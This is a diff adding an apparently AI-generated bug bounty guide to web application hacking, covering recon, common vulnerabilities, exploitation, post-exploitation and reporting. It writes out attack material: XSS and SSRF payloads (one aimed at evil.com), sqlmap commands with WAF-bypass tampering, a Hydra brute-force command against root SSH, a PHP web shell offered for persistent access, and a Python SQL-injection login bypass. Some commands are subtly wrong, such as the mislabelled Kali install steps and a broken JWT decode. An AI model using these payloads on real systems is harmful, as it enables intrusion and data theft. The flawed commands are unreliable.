@@ -1,0 +1,303 @@
+Comprehensive Web Application Hacking Guide for Bug Bounty Hunters
+Introduction to Web Application Hacking
+
+Web application hacking involves identifying vulnerabilities within web applications to exploit them. This guide focuses on methodologies, tools, and best practices for conducting ethical hacking, particularly for bug bounty programs. The content is organized into clear steps, with practical command examples provided where possible.
+Section 1: Getting Started with Web Application Hacking
+1.1 Understanding Web Application Architecture
+
+Before diving into hacking, it’s crucial to understand how web applications are built and how they operate. Key components include:
+
+    Frontend: The client-side part of the application that users interact with (HTML, CSS, JavaScript).
+    Backend: The server-side logic that processes requests and interacts with databases (PHP, Python, Node.js).
+    Database: Stores the application's data (MySQL, PostgreSQL, MongoDB).
+    APIs: Interfaces for interacting with the backend, often via REST or GraphQL.
+
+1.2 Setting Up Your Environment
+
+    Virtual Machines: Set up VMs using VirtualBox or VMware for isolated testing environments.
+    Kali Linux: Use Kali Linux or Parrot Security OS as your main operating system for hacking, as they come pre-installed with essential tools.
+
+    bash
+
+# Example to install Kali Linux on VirtualBox
+sudo apt-get update && sudo apt-get upgrade
+sudo apt-get install virtualbox-guest-x11
+
+Burp Suite: Essential for web application testing. The free version is good to start, but consider the Professional version for advanced features.
+
+bash
+
+# Launch Burp Suite on Kali Linux
+burpsuite &
+
+Postman: Install Postman for API testing.
+
+bash
+
+    # Install Postman on Linux
+    sudo snap install postman
+
+Section 2: Reconnaissance
+2.1 Passive Reconnaissance
+
+Passive reconnaissance involves gathering information about a target without direct interaction. Key techniques include:
+
+    WHOIS Lookup: Use tools like ViewDNS.info WHOIS to gather domain information.
+
+    bash
+
+# Using WHOIS command-line tool
+whois example.com
+
+DNS Records: Utilize SecurityTrails or DNSDumpster to gather DNS records.
+
+bash
+
+# Using Dig to gather DNS records
+dig example.com ANY
+
+Wayback Machine: Access historical versions of a website using the Wayback Machine to uncover hidden endpoints and old vulnerabilities.
+Google Dorking: Use advanced Google search operators to find sensitive information indexed by search engines.
+
+bash
+
+    # Example Google Dork
+    site:example.com filetype:pdf "confidential"
+    site:example.com inurl:admin
+
+2.2 Active Reconnaissance
+
+Active reconnaissance involves interacting with the target to gather more detailed information:
+
+    Subdomain Enumeration: Use tools like Sublist3r and Amass to find subdomains.
+
+    bash
+
+# Sublist3r command example
+sublist3r -d example.com
+
+# Amass command example
+amass enum -d example.com
+
+Port Scanning: Use Nmap or Masscan to scan for open ports and services.
+
+bash
+
+# Nmap example for port scanning
+nmap -sS -sV -p- example.com
+
+# Masscan example for faster scanning
+sudo masscan -p1-65535 --rate=1000 -e eth0 example.com
+
+Content Discovery: Tools like Dirb, Gobuster, and FFuF can help discover hidden directories and files.
+
+bash
+
+    # Gobuster example
+    gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+    # FFuF example
+    ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Section 3: Vulnerability Identification
+3.1 Common Web Application Vulnerabilities
+
+    SQL Injection (SQLi): Manipulate SQL queries by injecting malicious input.
+
+    bash
+
+# SQLMap command to test for SQL injection
+sqlmap -u "http://example.com/page?id=1" --batch --dbs
+
+Cross-Site Scripting (XSS): Inject malicious scripts into web pages viewed by others.
+
+javascript
+
+// Example XSS payload
+<script>alert('XSS');</script>
+
+Cross-Site Request Forgery (CSRF): Force a user to execute unwanted actions on a web application where they are authenticated.
+Server-Side Request Forgery (SSRF): Trick the server into making requests to unintended locations.
+
+bash
+
+# SSRF payload example
+http://localhost:8080/admin?url=http://evil.com
+
+Insecure Direct Object Reference (IDOR): Access unauthorized objects by manipulating parameters.
+
+bash
+
+    # Example of IDOR in URL
+    http://example.com/user?profile_id=123
+
+3.2 Advanced Vulnerability Types
+
+    Insecure Deserialization: Exploit vulnerabilities in how data is serialized and deserialized.
+    Business Logic Flaws: Identify flaws in the application’s logic that can be exploited to bypass intended functionalities.
+    WebSocket Security: Test for vulnerabilities in real-time applications using WebSockets.
+
+3.3 API Security Testing
+
+    REST APIs: Test for common API vulnerabilities such as excessive data exposure, broken object level authorization, and mass assignment.
+    GraphQL: Look for query batching, introspection, and injection vulnerabilities.
+
+    bash
+
+    # Example GraphQL query to enumerate fields
+    query {
+      __schema {
+        types {
+          name
+          fields {
+            name
+          }
+        }
+      }
+    }
+
+    Authentication Flaws: Test for weak password policies, improper session management, and MFA bypass.
+
+Section 4: Exploitation Techniques
+4.1 Cross-Site Scripting (XSS)
+
+    Stored XSS: Inject scripts that get stored on the server and executed when users visit the page.
+    Reflected XSS: Inject scripts that are reflected back from the server in the response.
+    DOM-Based XSS: Inject scripts that are executed within the browser via the Document Object Model.
+
+4.2 Server-Side Request Forgery (SSRF)
+
+    Blind SSRF: Use out-of-band techniques to detect SSRF, such as sending requests to a controlled server and monitoring traffic.
+    Bypassing Filters: Use tricks like URL encoding, IP obfuscation, and DNS rebinding to bypass SSRF protections.
+
+4.3 SQL Injection
+
+    Union-Based SQLi: Exploit vulnerabilities by unionizing multiple SELECT statements.
+    Blind SQLi: Extract data by sending queries that return true/false or generate time delays.
+
+    bash
+
+    # Example of Blind SQL Injection using SQLMap
+    sqlmap -u "http://example.com/page?id=1" --batch --technique=B --time-sec=5
+
+    Error-Based SQLi: Exploit database errors to retrieve information.
+
+4.4 Exploiting Authentication and Session Management
+
+    Brute Force: Use tools like Hydra or Burp Suite Intruder to perform brute-force attacks on login forms.
+
+    bash
+
+# Hydra command for brute-forcing SSH login
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://example.com
+
+Session Fixation: Force a user’s session ID to be set to a known value, allowing session hijacking.
+JWT Manipulation: Modify JSON Web Tokens (JWT) to escalate privileges or bypass authentication.
+
+bash
+
+    # Example of decoding a JWT
+    echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | base64 -d
+
+Section 5: Post-Exploitation
+5.1 Gaining Persistent Access
+
+    Web Shells: Deploy web shells for persistent access.
+
+    bash
+
+    # Simple PHP web shell
+    <?php system($_GET['cmd']); ?>
+
+    Privilege Escalation: Look for misconfigurations, vulnerable software, or weak file permissions to escalate privileges on the server.
+
+5.2 Data Exfiltration
+
+    Database Dumping: Use SQLMap or manual SQL queries to dump databases.
+    File Download: Abuse functionality to download sensitive files from the server.
+
+5.3 Lateral Movement
+
+    Pivoting: Use compromised servers to pivot deeper into the network.
+    Tunneling: Create SSH tunnels to access internal resources.
+
+Section 6: Reporting and Remediation
+6.1 Writing an Effective Bug Report
+
+    Clear Title: Summarize the vulnerability in the title.
+    Detailed Description: Describe the issue, impact, and how it was discovered.
+    Reproduction Steps: Provide clear, step-by-step instructions to reproduce the vulnerability.
+    Impact Analysis: Explain the potential damage or risk associated with the vulnerability.
+    Mitigation Suggestions: Offer solutions or recommendations for fixing the issue.
+
+6.2 Collaborating with Developers
+
+    Communicate Clearly: Use precise language to describe the vulnerability and its impact.
+    Follow Up: After reporting, follow up to ensure that the vulnerability is properly understood and patched.
+
+6.3 Tracking Remediation Progress
+
+    Vulnerability Management Tools: Use tools like JIRA or Bugzilla to track the status of reported vulnerabilities.
+    Retesting: Once patched, retest the vulnerability to confirm that it has been properly mitigated.
+
+Section 7: Advanced Techniques and Tools
+7.1 Bypassing WAFs and Other Protections
+
+    WAF Evasion: Use techniques like SQL obfuscation, payload encoding, and case manipulation to bypass Web Application Firewalls (WAFs).
+
+    bash
+
+    # SQLMap example with tamper scripts for WAF bypass
+    sqlmap -u "http://example.com/page?id=1" --batch --dbs --tamper=space2comment
+
+7.2 Custom Exploits
+
+    Writing Custom Payloads: Use Python or other scripting languages to write custom exploits tailored to specific vulnerabilities.
+
+    python
+
+    # Example of a simple Python exploit
+    import requests
+
+    target = "http://example.com/vulnerable"
+    payload = {"username": "admin' OR 1=1 --", "password": "pass"}
+    response = requests.post(target, data=payload)
+    print(response.text)
+
+7.3 Integrating OSINT with Web Application Testing
+
+    OSINT Techniques: Use OSINT to gather additional information that can help in exploiting web applications, such as employee emails, internal server names, and leaked credentials.
+
+Section 8: IoT Reconnaissance
+8.1 Monitoring Dark Web Forums
+
+    Dark Web Monitoring: Keep an eye on dark web forums and marketplaces for leaked credentials, vulnerabilities, and other relevant information.
+
+8.2 IoT Device Testing
+
+    Shodan for IoT Devices: Use Shodan to find exposed IoT devices and test for vulnerabilities.
+
+    bash
+
+    # Shodan search example
+    shodan search "webcam"
+
+    Thingful for IoT Devices: Use Thingful to discover IoT devices connected to the internet.
+
+Section 9: Ethical Considerations and Legal Compliance
+9.1 Understanding Bug Bounty Policies
+
+    Scope and Rules: Always review the bug bounty program’s scope and rules to ensure compliance.
+    Ethical Boundaries: Avoid testing on systems that are out of scope, and never exploit found vulnerabilities beyond what is necessary to demonstrate the issue.
+
+9.2 Legal Compliance
+
+    Data Protection Laws: Understand and comply with data protection laws like GDPR when handling sensitive data.
+    Responsible Disclosure: Follow responsible disclosure practices to avoid legal consequences and ensure that vulnerabilities are fixed properly.
+
+Conclusion
+
+This guide provides a comprehensive overview of the methodologies, tools, and techniques for web application hacking, specifically tailored for bug bounty hunters. By following these guidelines, you can effectively identify, exploit, and report vulnerabilities while maintaining ethical and legal standards. The key to success in bug bounty hunting is continuous learning, practice, and staying updated with the latest trends in web application security.
+
+This complete guide integrates practical command examples and presents the content in an organized and accessible manner. It is designed to serve as a valuable resource for both novice and experienced bug bounty hunters.
+ChatGPT can make mistakes. Check important info.
